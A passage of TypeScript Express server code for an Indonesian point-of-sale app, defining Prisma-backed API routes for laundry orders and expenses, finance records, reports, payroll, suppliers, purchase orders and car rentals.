      'UPDATE_LAUNDRY_SERVICE',
      `Mengubah layanan laundry ID ${service.id}: ${service.kategori} - ${service.nama}`
    );
    res.json(service);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengubah layanan laundry' });
  }
});

app.delete('/api/laundry/services/:id', requireAdmin, async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const service = await (prisma as any).laundryService.delete({
      where: { id: Number(id) }
    });
    logActivity(
      req.headers['x-employee-id'],
      'DELETE_LAUNDRY_SERVICE',
      `Menghapus layanan laundry: ${service.kategori} - ${service.nama}`
    );
    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Gagal menghapus layanan laundry' });
  }
});

// ─────────────────────────────────────────────────────────────
// Laundry - Orders (READ: KASIR+ | WRITE: KASIR+)
// ─────────────────────────────────────────────────────────────
app.get('/api/laundry/orders', async (req: Request, res: Response) => {
  try {
    const { cari, filterBayar, filterTipe } = req.query;
    let whereClause: any = {};

    if (cari) {
      whereClause.namaPelanggan = { contains: cari as string, mode: 'insensitive' };
    }

    if (filterBayar && filterBayar !== 'Semua') {
      whereClause.statusBayar = filterBayar;
    }

    if (filterTipe === 'Plastik') {
      whereClause.jenisLayanan = { contains: 'Barang', mode: 'insensitive' };
    } else if (filterTipe === 'Laundry') {
      whereClause.jenisLayanan = {
        NOT: { contains: 'Barang', mode: 'insensitive' }
      };
    }

    const orders = await (prisma as any).laundryOrder.findMany({
      where: whereClause,
      include: { employee: true, customer: true },
      orderBy: { id: 'desc' }
    });
    res.json(orders);
  } catch (error) {
    res.status(500).json({ error: 'Gagal mengambil data order laundry' });
  }
});

app.get('/api/laundry/orders/:id', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const order = await (prisma as any).laundryOrder.findUnique({
      where: { id: Number(id) },
      include: { employee: true, customer: true }
    });
    if (!order) return res.status(404).json({ error: 'Order laundry tidak ditemukan' });
    res.json(order);
  } catch (error) {
    res.status(500).json({ error: 'Gagal mengambil detail order laundry' });
  }
});

app.post('/api/laundry/orders', requireNotDemo, async (req: Request, res: Response) => {
  try {
    const {
      namaPelanggan, noHp, jenisLayanan, jenisLaundry, totalHarga, statusBayar,
      selimut, sprei, boneka, korden, lokasi, customerId
    } = req.body;

    const employeeIdHeader = req.headers['x-employee-id'] as string;
    let employeeId: number | null = null;
    if (employeeIdHeader && employeeIdHeader !== '0') {
      employeeId = Number(employeeIdHeader);
    }

    const receiptNumber = `INV-LND-${Date.now()}`;

    const order = await (prisma as any).laundryOrder.create({
      data: {
        receiptNumber,
        namaPelanggan,
        noHp: noHp || '-',
        jenisLayanan: jenisLayanan || '-',
        jenisLaundry: jenisLaundry || '-',
        totalHarga: Number(totalHarga) || 0,
        statusBayar: statusBayar || 'Belum Lunas',
        status: 'Menunggu',
        selimut: Number(selimut || 0),
        sprei: Number(sprei || 0),
        boneka: Number(boneka || 0),
        korden: Number(korden || 0),
        lokasi: lokasi || null,
        employeeId,
        customerId: customerId ? Number(customerId) : null
      }
    });

    logActivity(
      employeeIdHeader,
      'CREATE_LAUNDRY_ORDER',
      `Membuat pesanan laundry baru ${receiptNumber} untuk ${namaPelanggan} senilai Rp ${order.totalHarga.toLocaleString('id-ID')}`
    );

    res.json(order);
  } catch (error) {
    console.error(error);
    res.status(400).json({ error: 'Gagal membuat pesanan laundry' });
  }
});

app.put('/api/laundry/orders/status/:id', requireNotDemo, async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { status } = req.body;

    const order = await (prisma as any).laundryOrder.update({
      where: { id: Number(id) },
      data: {
        status,
        ...(status === 'Selesai' || status === 'Diambil' ? { tanggalSelesai: new Date() } : {})
      }
    });

    logActivity(
      req.headers['x-employee-id'],
      'UPDATE_LAUNDRY_STATUS',
      `Mengubah status pesanan laundry ${order.receiptNumber} menjadi: ${status}`
    );

    res.json(order);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengubah status pesanan laundry' });
  }
});

app.put('/api/laundry/orders/pay/:id', requireNotDemo, async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const order = await (prisma as any).laundryOrder.findUnique({ where: { id: Number(id) } });
    if (!order) return res.status(404).json({ error: 'Pesanan laundry tidak ditemukan' });

    const statusLama = order.statusBayar || 'Belum Lunas';
    const statusBaru = statusLama === 'Lunas' ? 'Belum Lunas' : 'Lunas';

    const updated = await (prisma as any).laundryOrder.update({
      where: { id: Number(id) },
      data: { statusBayar: statusBaru }
    });

    logActivity(
      req.headers['x-employee-id'],
      'UPDATE_LAUNDRY_PAYMENT',
      `Mengubah pembayaran pesanan laundry ${order.receiptNumber} menjadi: ${statusBaru}`
    );

    res.json(updated);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengubah status pembayaran laundry' });
  }
});

app.delete('/api/laundry/orders/:id', requireAdmin, async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const order = await (prisma as any).laundryOrder.delete({
      where: { id: Number(id) }
    });

    logActivity(
      req.headers['x-employee-id'],
      'DELETE_LAUNDRY_ORDER',
      `Menghapus pesanan laundry ${order.receiptNumber}`
    );

    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Gagal menghapus pesanan laundry' });
  }
});

// ─────────────────────────────────────────────────────────────
// Laundry Expenses - (READ: ADMIN+ | WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/laundry/expenses', requireAdmin, async (req: Request, res: Response) => {
  try {
    const expenses = await (prisma as any).laundryExpense.findMany({
      orderBy: { tanggal: 'desc' }
    });
    res.json(expenses);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengambil data pengeluaran laundry' });
  }
});

app.post('/api/laundry/expenses', requireAdmin, async (req: Request, res: Response) => {
  try {
    const { kategori, nominal, keterangan, tanggal } = req.body;
    const expense = await (prisma as any).laundryExpense.create({
      data: {
        kategori,
        nominal: Number(nominal),
        keterangan: keterangan || null,
        tanggal: tanggal ? new Date(tanggal) : new Date()
      }
    });

    logActivity(
      req.headers['x-employee-id'],
      'CREATE_LAUNDRY_EXPENSE',
      `Mencatat pengeluaran laundry baru: ${expense.kategori} senilai Rp ${expense.nominal.toLocaleString('id-ID')}`
    );

    res.json(expense);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mencatat pengeluaran laundry' });
  }
});

app.put('/api/laundry/expenses/:id', requireAdmin, async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { kategori, nominal, keterangan, tanggal } = req.body;
    const expense = await (prisma as any).laundryExpense.update({
      where: { id: Number(id) },
      data: {
        kategori,
        nominal: Number(nominal),
        keterangan: keterangan || null,
        tanggal: tanggal ? new Date(tanggal) : undefined
      }
    });

    logActivity(
      req.headers['x-employee-id'],
      'UPDATE_LAUNDRY_EXPENSE',
      `Mengubah pengeluaran laundry ID ${expense.id}`
    );

    res.json(expense);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengubah pengeluaran laundry' });
  }
});

app.delete('/api/laundry/expenses/:id', requireAdmin, async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const expense = await (prisma as any).laundryExpense.delete({
      where: { id: Number(id) }
    });

    logActivity(
      req.headers['x-employee-id'],
      'DELETE_LAUNDRY_EXPENSE',
      `Menghapus pengeluaran laundry: ${expense.kategori} senilai Rp ${expense.nominal.toLocaleString('id-ID')}`
    );

    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Gagal menghapus pengeluaran laundry' });
  }
});

// ─────────────────────────────────────────────────────────────
// Finance  (READ/WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/finances', requireAdmin, async (req, res) => {
  try {
    const appMode = req.headers['x-app-mode'] as string;
    const finances = await prisma.finance.findMany({
      where: appMode === 'RENTAL' ? {
        OR: [
          { description: { startsWith: '[RENTAL]' } },
          { description: { startsWith: 'Sewa Mobil' } },
          { description: { startsWith: 'Denda Telat Sewa Mobil' } }
        ]
      } : {
        AND: [
          { description: { not: { startsWith: '[RENTAL]' } } },
          { description: { not: { startsWith: 'Sewa Mobil' } } },
          { description: { not: { startsWith: 'Denda Telat' } } }
        ]
      },
      include: { customer: true },
      orderBy: { date: 'desc' }
    });
    res.json(finances);
  } catch (error) {
    res.status(400).json({ error: 'Failed to fetch finances' });
  }
});

app.post('/api/finances', requireAdmin, async (req, res) => {
  try {
    const { type, amount, description, date, status, customerId } = req.body;
    const appMode = req.headers['x-app-mode'] as string;
    let finalDesc = description;
    if (appMode === 'RENTAL' && !description.startsWith('[RENTAL]')) {
      finalDesc = `[RENTAL] ${description}`;
    }
    const finance = await prisma.finance.create({
      data: {
        type,
        amount: Number(amount),
        description: finalDesc,
        date: date ? new Date(date) : new Date(),
        status: status || 'PENDING',
        customerId: customerId ? Number(customerId) : null,
      }
    });
    logActivity(
      req.headers['x-employee-id'],
      'CREATE_FINANCE',
      `Membuat catatan keuangan ${finance.type} senilai Rp ${finance.amount.toLocaleString('id-ID')} (${finance.description})`
    );
    res.json(finance);
  } catch (error) {
    res.status(400).json({ error: 'Failed to create finance record' });
  }
});

app.put('/api/finances/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { type, amount, description, date, status, customerId } = req.body;

    if (Number(amount) <= 0) {
      return res.status(400).json({ error: 'Nominal harus lebih dari 0' });
    }

    const appMode = req.headers['x-app-mode'] as string;
    let finalDesc = description;
    if (description && appMode === 'RENTAL' && !description.startsWith('[RENTAL]')) {
      finalDesc = `[RENTAL] ${description}`;
    }

    const finance = await prisma.finance.update({
      where: { id: Number(id) },
      data: {
        type, amount: Number(amount), description: finalDesc,
        date: date ? new Date(date) : undefined,
        status, customerId: customerId ? Number(customerId) : null,
      },
      include: { customer: true },
    });
    logActivity(
      req.headers['x-employee-id'],
      'UPDATE_FINANCE',
      `Mengubah catatan keuangan ID ${finance.id} (${finance.type}) menjadi Rp ${finance.amount.toLocaleString('id-ID')} (Status: ${finance.status})`
    );
    res.json(finance);
  } catch (error) {
    res.status(400).json({ error: 'Failed to update finance record' });
  }
});

app.delete('/api/finances/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const numId = Number(id);

    // Ambil data sebelum dihapus untuk cek apakah hutang dari PO
    const fin = await prisma.finance.findUnique({ where: { id: numId } });
    if (!fin) return res.status(404).json({ error: 'Data tidak ditemukan' });

    // Jika hutang dari PO — kembalikan status PO ke ORDERED agar bisa di-manage ulang
    if (fin.type === 'PAYABLE' && fin.description?.startsWith('Hutang PO #')) {
      const match = fin.description.match(/Hutang PO #(\d+)/);
      if (match) {
        const poId = Number(match[1]);
        await (prisma as any).purchaseOrder.updateMany({
          where: { id: poId, status: 'RECEIVED' },
          data: { status: 'ORDERED' },
        }).catch(() => { }); // silent: PO mungkin sudah dihapus
      }
    }

    // Jika piutang/hutang memiliki deskripsi yang mengandung nomor transaksi INV-xxx
    if (fin.description) {
      const match = fin.description.match(/INV-\d+/);
      if (match) {
        const receiptNumber = match[0];
        const tx = await prisma.transaction.findUnique({
          where: { receiptNumber }
        });
        if (tx) {
          // Kembalikan stok produk
          const txItems = await prisma.transactionItem.findMany({
            where: { transactionId: tx.id }
          });
          for (const item of txItems) {
            await prisma.product.update({
              where: { id: item.productId },
              data: { stock: { increment: item.quantity } }
            }).catch(() => { });
          }
          // Hapus item transaksi
          await prisma.transactionItem.deleteMany({
            where: { transactionId: tx.id }
          });
          // Hapus transaksi
          await prisma.transaction.delete({
            where: { id: tx.id }
          });
          logActivity(
            req.headers['x-employee-id'],
            'DELETE_TRANSACTION',
            `Menghapus transaksi ${receiptNumber} secara otomatis karena catatan keuangan terkait dihapus`
          );
        }
      }
    }

    await prisma.finance.delete({ where: { id: numId } });
    logActivity(
      req.headers['x-employee-id'],
      'DELETE_FINANCE',
      `Menghapus catatan keuangan ${fin.type} senilai Rp ${fin.amount.toLocaleString('id-ID')} (${fin.description})`
    );
    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Failed to delete finance record' });
  }
});

// ─────────────────────────────────────────────────────────────
// Reports  (ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/reports', requireAdmin, async (req, res) => {
  try {
    const { from, to } = req.query;
    const appMode = req.headers['x-app-mode'] as string;

    const dateFilter: any = {};
    let dateFilterActive = false;
    const isValidDateStr = (val: any) => val && val !== 'undefined' && val !== 'null' && String(val).trim() !== '';

    if (isValidDateStr(from) || isValidDateStr(to)) {
      if (isValidDateStr(from)) dateFilter.gte = new Date(from as string);
      if (isValidDateStr(to)) {
        const toDate = new Date(to as string);
        toDate.setHours(23, 59, 59, 999);
        dateFilter.lte = toDate;
      }
      dateFilterActive = true;
    }

    const tzOffset = 7 * 60 * 60 * 1000;
    const localNow = new Date(Date.now() + tzOffset);
    const startOfToday = new Date(Date.UTC(localNow.getUTCFullYear(), localNow.getUTCMonth(), localNow.getUTCDate(), 0, 0, 0, 0) - tzOffset);
    const endOfToday = new Date(Date.UTC(localNow.getUTCFullYear(), localNow.getUTCMonth(), localNow.getUTCDate(), 23, 59, 59, 999) - tzOffset);

    if (appMode === 'LAUNDRY') {
      const orderWhere: any = { statusBayar: 'Lunas' };
      const pendingWhere: any = { statusBayar: 'Belum Lunas' };
      const expenseWhere: any = {};

      if (dateFilterActive) {
        orderWhere.tanggalMasuk = dateFilter;
        pendingWhere.tanggalMasuk = dateFilter;
        expenseWhere.tanggal = dateFilter;
      }

      const totalSales = await (prisma as any).laundryOrder.aggregate({
        where: orderWhere,
        _sum: { totalHarga: true }
      });
      const totalSalesVal = totalSales._sum.totalHarga || 0;

      const todaySales = await (prisma as any).laundryOrder.aggregate({
        where: {
          statusBayar: 'Lunas',
          tanggalMasuk: { gte: startOfToday, lte: endOfToday }
        },
        _sum: { totalHarga: true }
      });
      const todaySalesVal = todaySales._sum.totalHarga || 0;

      const expenses = await (prisma as any).laundryExpense.aggregate({
        where: expenseWhere,
        _sum: { nominal: true }
      });
      const totalExpensesVal = expenses._sum.nominal || 0;

      const receivables = await (prisma as any).laundryOrder.aggregate({
        where: pendingWhere,
        _sum: { totalHarga: true }
      });
      const pendingReceivablesVal = receivables._sum.totalHarga || 0;

      return res.json({
        totalSales: totalSalesVal,
        todaySales: todaySalesVal,
        totalExpenses: totalExpensesVal,
        pendingReceivables: pendingReceivablesVal,
        pendingPayables: 0,
        netIncome: totalSalesVal - totalExpensesVal
      });
    }

    const financeBaseWhere = appMode === 'RENTAL' ? {
      OR: [
        { description: { startsWith: '[RENTAL]' } },
        { description: { startsWith: 'Sewa Mobil' } },
        { description: { startsWith: 'Denda Telat Sewa Mobil' } }
      ]
    } : {
      AND: [
        { description: { not: { startsWith: '[RENTAL]' } } },
        { description: { not: { startsWith: 'Sewa Mobil' } } },
        { description: { not: { startsWith: 'Denda Telat' } } }
      ]
    };

    const expenseWhere: any = { type: 'EXPENSE', ...financeBaseWhere };
    const receivableWhere: any = { type: 'RECEIVABLE', status: 'PENDING', ...financeBaseWhere };
    const payableWhere: any = { type: 'PAYABLE', status: 'PENDING', ...financeBaseWhere };

    if (dateFilterActive) {
      expenseWhere.date = dateFilter;
      receivableWhere.date = dateFilter;
      payableWhere.date = dateFilter;
    }

    let totalSalesVal = 0;
    let todaySalesVal = 0;

    if (appMode === 'RENTAL') {
      const rentalWhere: any = {};
      if (dateFilterActive) {
        rentalWhere.createdAt = dateFilter;
      }
      const totalRentals = await prisma.rental.aggregate({
        where: rentalWhere,
        _sum: { totalPrice: true }
      });
      totalSalesVal = totalRentals._sum.totalPrice || 0;

      const todayRentals = await prisma.rental.aggregate({
        where: {
          createdAt: { gte: startOfToday, lte: endOfToday }
        },
        _sum: { totalPrice: true }
      });
      todaySalesVal = todayRentals._sum.totalPrice || 0;
    } else {
      const salesWhere: any = { type: 'SALES', status: { not: 'CANCELLED' } };
      if (dateFilterActive) {
        salesWhere.date = dateFilter;
      }
      const totalSales = await prisma.transaction.aggregate({
        where: salesWhere,
        _sum: { total: true }
      });
      totalSalesVal = totalSales._sum.total || 0;

      const todaySales = await prisma.transaction.aggregate({
        where: {
          type: 'SALES',
          status: { not: 'CANCELLED' },
          date: { gte: startOfToday, lte: endOfToday }
        },
        _sum: { total: true }
      });
      todaySalesVal = todaySales._sum.total || 0;
    }

    const expenses = await prisma.finance.aggregate({
      where: expenseWhere,
      _sum: { amount: true }
    });
    const receivables = await prisma.finance.aggregate({
      where: receivableWhere,
      _sum: { amount: true }
    });
    const payables = await prisma.finance.aggregate({
      where: payableWhere,
      _sum: { amount: true }
    });

    res.json({
      totalSales: totalSalesVal,
      todaySales: todaySalesVal,
      totalExpenses: expenses._sum.amount || 0,
      pendingReceivables: receivables._sum.amount || 0,
      pendingPayables: payables._sum.amount || 0,
      netIncome: totalSalesVal - (expenses._sum.amount || 0)
    });
  } catch (error) {
    console.error('Error generating report:', error);
    res.status(400).json({ error: 'Failed to generate report' });
  }
});

// ─────────────────────────────────────────────────────────────
// Payroll  (OWNER only)
// Terintegrasi ke Finance sebagai tipe EXPENSE dengan prefix [Gaji]
// ─────────────────────────────────────────────────────────────

/** Ambil riwayat penggajian bulan tertentu */
app.get('/api/payroll/history', requireOwner, async (req, res) => {
  try {
    const { month, year } = req.query;
    const m = Number(month) || new Date().getMonth() + 1;
    const y = Number(year) || new Date().getFullYear();
    const start = new Date(y, m - 1, 1);
    const end = new Date(y, m, 1);
    const records = await prisma.finance.findMany({
      where: {
        description: { startsWith: '[Gaji]' },
        date: { gte: start, lt: end }
      },
      orderBy: { date: 'desc' }
    });
    res.json(records);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengambil riwayat gaji' });
  }
});

/** Bayar gaji satu karyawan → buat Finance EXPENSE */
app.post('/api/payroll/pay', requireOwner, async (req, res) => {
  try {
    const employeeIdHeader = req.headers['x-employee-id'] as string;
    if (Number(employeeIdHeader) === 0 || Number(employeeIdHeader) === 9999) {
      return res.status(403).json({ error: 'Akun demo tidak dapat membayar gaji' });
    }

    const { employeeId, month, year, amount, note } = req.body;
    const m = Number(month) || new Date().getMonth() + 1;
    const y = Number(year) || new Date().getFullYear();

    // Ambil data karyawan
    const emp = await prisma.employee.findUnique({ where: { id: Number(employeeId) } });
    if (!emp) return res.status(404).json({ error: 'Karyawan tidak ditemukan' });

    // Cek sudah dibayar bulan ini?
    const start = new Date(y, m - 1, 1);
    const end = new Date(y, m, 1);
    const prefix = `[Gaji] ID:${emp.id} -`;
    const existing = await prisma.finance.findFirst({
      where: { description: { startsWith: prefix }, date: { gte: start, lt: end } }
    });
    if (existing) {
      return res.status(400).json({ error: `Gaji ${emp.name} sudah dibayarkan untuk bulan ini.` });
    }

    const payAmount = Number(amount) || emp.salary;
    if (payAmount <= 0) {
      return res.status(400).json({ error: 'Nominal gaji harus lebih dari 0. Set gaji pokok karyawan terlebih dahulu.' });
    }

    const monthNames = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
    const record = await prisma.finance.create({
      data: {
        type: 'EXPENSE',
        amount: payAmount,
        description: `[Gaji] ID:${emp.id} - ${emp.name} (${monthNames[m - 1]} ${y})${note ? ' · ' + note : ''}`,
        date: new Date(),
        status: 'PAID',
      }
    });
    logActivity(
      employeeIdHeader,
      'PAY_SALARY',
      `Membayar gaji karyawan ${emp.name} (${monthNames[m - 1]} ${y}) sebesar Rp ${payAmount.toLocaleString('id-ID')}`
    );
    res.json(record);
  } catch (error) {
    console.error(error);
    res.status(400).json({ error: 'Gagal memproses pembayaran gaji' });
  }
});

// ─────────────────────────────────────────────────────────────
// Seed  (OWNER only)
// ─────────────────────────────────────────────────────────────
app.post('/api/seed', requireOwner, async (req, res) => {
  try {
    const admin = await prisma.employee.create({
      data: { name: 'Admin', role: 'ADMIN', pin: '1234' }
    });
    const product = await prisma.product.create({
      data: { name: 'Kopi Susu', price: 20000, stock: 100 }
    });
    res.json({ message: 'Seeded successfully', admin, product });
  } catch (error) {
    res.status(500).json({ error: 'Already seeded or error occurred' });
  }
});

// ─────────────────────────────────────────────────────────────
// Reset Keuangan & Laporan  (OWNER only)
// ─────────────────────────────────────────────────────────────
app.post('/api/reset-finance', requireOwner, async (req, res) => {
  try {
    const delItems = await prisma.transactionItem.deleteMany();
    const delTx = await prisma.transaction.deleteMany();
    const delFin = await prisma.finance.deleteMany();
    logActivity(
      req.headers['x-employee-id'],
      'RESET_FINANCE',
      'Mereset semua data transaksi dan keuangan ke nol'
    );
    res.json({
      message: 'Keuangan & Laporan berhasil direset.',
      deleted: {
        transactionItems: delItems.count,
        transactions: delTx.count,
        finances: delFin.count,
      }
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Gagal mereset data' });
  }
});

// ─────────────────────────────────────────────────────────────
// Supplier  (CRUD — ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/suppliers', requireAdmin, async (req, res) => {
  try {
    const suppliers = await (prisma as any).supplier.findMany({ orderBy: { name: 'asc' } });
    res.json(suppliers);
  } catch (error) { res.status(400).json({ error: 'Gagal ambil data supplier' }); }
});

app.post('/api/suppliers', requireAdmin, async (req, res) => {
  try {
    const { name, phone, address, notes } = req.body;
    if (!name) return res.status(400).json({ error: 'Nama supplier wajib diisi' });
    const supplier = await (prisma as any).supplier.create({ data: { name, phone, address, notes } });
    res.json(supplier);
  } catch (error) { res.status(400).json({ error: 'Gagal tambah supplier' }); }
});

app.put('/api/suppliers/:id', requireAdmin, async (req, res) => {
  try {
    const { name, phone, address, notes } = req.body;
    const supplier = await (prisma as any).supplier.update({
      where: { id: Number(req.params.id) }, data: { name, phone, address, notes }
    });
    res.json(supplier);
  } catch (error) { res.status(400).json({ error: 'Gagal update supplier' }); }
});

app.delete('/api/suppliers/:id', requireOwner, async (req, res) => {
  try {
    await (prisma as any).supplier.delete({ where: { id: Number(req.params.id) } });
    res.json({ success: true });
  } catch (error) { res.status(400).json({ error: 'Gagal hapus supplier' }); }
});

// ─────────────────────────────────────────────────────────────
// Purchase Orders  (ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/purchase-orders', requireAdmin, async (req, res) => {
  try {
    const pos = await (prisma as any).purchaseOrder.findMany({
      include: { supplier: true, items: { include: { product: true } } },
      orderBy: { date: 'desc' }
    });
    res.json(pos);
  } catch (error) { res.status(400).json({ error: 'Gagal ambil data PO' }); }
});

app.post('/api/purchase-orders', requireAdmin, async (req, res) => {
  try {
    const { supplierId, notes, items } = req.body;
    // items: [{productId, quantity, costPrice}]
    if (!supplierId || !items?.length) return res.status(400).json({ error: 'Supplier dan item PO wajib diisi' });
    const total = items.reduce((s: number, i: any) => s + Number(i.costPrice) * Number(i.quantity), 0);
    const po = await (prisma as any).purchaseOrder.create({
      data: {
        supplierId: Number(supplierId),
        notes,
        total,
        items: {
          create: items.map((i: any) => ({
            productId: Number(i.productId),
            quantity: Number(i.quantity),
            costPrice: Number(i.costPrice),
          }))
        }
      },
      include: { supplier: true, items: { include: { product: true } } }
    });
    res.json(po);
  } catch (error) {
    console.error(error);
    res.status(400).json({ error: 'Gagal buat PO' });
  }
});

app.put('/api/purchase-orders/:id', requireAdmin, async (req, res) => {
  try {
    const { status, notes } = req.body;
    const po = await (prisma as any).purchaseOrder.update({
      where: { id: Number(req.params.id) }, data: { status, notes }
    });
    res.json(po);
  } catch (error) { res.status(400).json({ error: 'Gagal update PO' }); }
});

// Konfirmasi terima barang: update stok produk + catat hutang ke supplier
app.post('/api/purchase-orders/:id/receive', requireAdmin, async (req, res) => {
  try {
    const poId = Number(req.params.id);
    const po = await (prisma as any).purchaseOrder.findUnique({
      where: { id: poId },
      include: { supplier: true, items: { include: { product: true } } }
    });
    if (!po) return res.status(404).json({ error: 'PO tidak ditemukan' });
    if (po.status === 'RECEIVED') return res.status(400).json({ error: 'PO sudah pernah diterima' });

    // Update stok setiap produk di PO
    await Promise.all(po.items.map((item: any) =>
      prisma.product.update({
        where: { id: item.productId },
        data: { stock: { increment: item.quantity }, costPrice: item.costPrice }
      })
    ));

    // Catat hutang ke supplier di modul Keuangan
    await prisma.finance.create({
      data: {
        type: 'PAYABLE',
        amount: po.total,
        description: `Hutang PO #${poId} ke ${po.supplier.name}`,
        status: 'PENDING',
      }
    });

    // Update status PO jadi RECEIVED
    const updated = await (prisma as any).purchaseOrder.update({
      where: { id: poId }, data: { status: 'RECEIVED' }
    });

    logActivity(
      req.headers['x-employee-id'],
      'RECEIVE_PO',
      `Menerima barang untuk PO #${poId} dari supplier ${po.supplier.name} senilai Rp ${po.total.toLocaleString('id-ID')}`
    );

    res.json({ success: true, po: updated });
  } catch (error) {
    console.error(error);
    res.status(400).json({ error: 'Gagal konfirmasi terima PO' });
  }
});

app.delete('/api/purchase-orders/:id', requireOwner, async (req, res) => {
  try {
    const po = await (prisma as any).purchaseOrder.findUnique({ where: { id: Number(req.params.id) } });
    if (po?.status === 'RECEIVED') return res.status(400).json({ error: 'PO yang sudah diterima tidak bisa dihapus' });
    await (prisma as any).purchaseOrder.delete({ where: { id: Number(req.params.id) } });
    logActivity(
      req.headers['x-employee-id'],
      'DELETE_PO',
      `Menghapus PO #${req.params.id}`
    );
    res.json({ success: true });
  } catch (error) { res.status(400).json({ error: 'Gagal hapus PO' }); }
});

// ─────────────────────────────────────────────────────────────
// Pre-Orders  (filter transaksi bertipe PRE_ORDER)
// ─────────────────────────────────────────────────────────────
app.get('/api/pre-orders', requireAdmin, async (req, res) => {
  try {
    const orders = await prisma.transaction.findMany({
      where: { type: 'PRE_ORDER' },
      include: { items: { include: { product: true } }, customer: true },
      orderBy: { deliveryDate: 'asc' }
    } as any);
    res.json(orders);
  } catch (error) { res.status(400).json({ error: 'Gagal ambil pre-order' }); }
});

// Update status pre-order (BOOKED → DP_PAID → COMPLETED) dan dp amount
app.patch('/api/pre-orders/:id/status', requireAdmin, async (req, res) => {
  try {
    const { orderStatus, dpAmount } = req.body;
    const updated = await (prisma.transaction as any).update({
      where: { id: Number(req.params.id) },
      data: {
        ...(orderStatus && { orderStatus }),
        ...(dpAmount !== undefined && { dpAmount: Number(dpAmount) }),
        ...(orderStatus === 'COMPLETED' && { status: 'COMPLETED' })
      }
    });
    res.json(updated);
  } catch (error) { res.status(400).json({ error: 'Gagal update status pre-order' }); }
});




// ─────────────────────────────────────────────────────────────
// Car Rental Feature APIs
// ─────────────────────────────────────────────────────────────

// Get all cars
app.get('/api/cars', requireAdmin, checkExcludedEmployee, async (req, res) => {
  try {
    const cars = await prisma.car.findMany({ orderBy: { name: 'asc' } });
    res.json(cars);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengambil data mobil' });
  }
});

// Create new car
app.post('/api/cars', requireAdmin, checkExcludedEmployee, async (req, res) => {
  try {
    const { name, plateNumber, type, pricePerDay, status } = req.body;
    if (!name || !plateNumber || !type || !pricePerDay) {
      return res.status(400).json({ error: 'Semua field wajib diisi' });
    }
    const car = await prisma.car.create({
      data: {
        name,
        plateNumber,
        type,
        pricePerDay: Number(pricePerDay),
        status: status || 'AVAILABLE'
      }
    });
    logActivity(
      req.headers['x-employee-id'],
      'CREATE_CAR',
      `Menambahkan mobil baru ${car.name} (${car.plateNumber}) dengan tarif Rp ${car.pricePerDay.toLocaleString('id-ID')}/hari`
    );
    res.json(car);
  } catch (error) {
    res.status(400).json({ error: 'Gagal menambah data mobil. Pastikan plat nomor belum terdaftar.' });
  }
});

// Update car details
app.put('/api/cars/:id', requireAdmin, checkExcludedEmployee, async (req, res) => {
  try {
    const { id } = req.params;
    const { name, plateNumber, type, pricePerDay, status } = req.body;
    const car = await prisma.car.update({
      where: { id: Number(id) },
      data: {
        name,
        plateNumber,
        type,
        pricePerDay: pricePerDay !== undefined ? Number(pricePerDay) : undefined,
        status
      }
    });
    logActivity(
      req.headers['x-employee-id'],
      'UPDATE_CAR',
      `Mengubah data mobil ${car.name} (${car.plateNumber}), Status: ${car.status}, Tarif: Rp ${car.pricePerDay.toLocaleString('id-ID')}/hari`
    );
    res.json(car);
  } catch (error) {
    res.status(400).json({ error: 'Gagal memperbarui data mobil' });
  }
});

// Delete a car
app.delete('/api/cars/:id', requireAdmin, checkExcludedEmployee, async (req, res) => {
  try {
    const { id } = req.params;
    const carId = Number(id);
    // Cek apakah mobil sedang disewa
    const activeRental = await prisma.rental.findFirst({
      where: { carId, status: 'ACTIVE' }
    });
    if (activeRental) {
      return res.status(400).json({ error: 'Mobil tidak dapat dihapus karena sedang aktif disewa.' });
    }
    const car = await prisma.car.findUnique({ where: { id: carId } });
    await prisma.car.delete({ where: { id: carId } });
    logActivity(
      req.headers['x-employee-id'],
      'DELETE_CAR',
      `Menghapus mobil ${car?.name || id} (${car?.plateNumber})`
    );
    res.json({ success: true });
  } catch (error) {
    res.status(400).json({ error: 'Gagal menghapus data mobil' });
  }
});

// Get all rental logs
app.get('/api/rentals', requireAdmin, checkExcludedEmployee, async (req, res) => {
  try {
    const rentals = await prisma.rental.findMany({
      include: {
        car: true,
        customer: true,
        employee: { select: { name: true } }
      },
      orderBy: { createdAt: 'desc' }
    });
    res.json(rentals);
  } catch (error) {
    res.status(400).json({ error: 'Gagal mengambil data sewa' });
  }
});

// Rent a car
app.post('/api/rentals', requireAdmin, checkExcludedEmployee, async (req, res) => {
  try {
    const { carId, customerId, customerName, startDate, endDate, totalPrice, paymentMethod, identityText } = req.body;
    const employeeIdHeader = req.headers['x-employee-id'] as string;
    const empId = Number(employeeIdHeader) || 1;

    if (!carId || !customerName || !startDate || !endDate || !totalPrice || !paymentMethod) {
      return res.status(400).json({ error: 'Semua data penyewaan wajib diisi' });
    }

    const rental = await prisma.$transaction(async (tx) => {
      // 1. Cek mobil tersedia
      const car = await tx.car.findUnique({ where: { id: Number(carId) } });
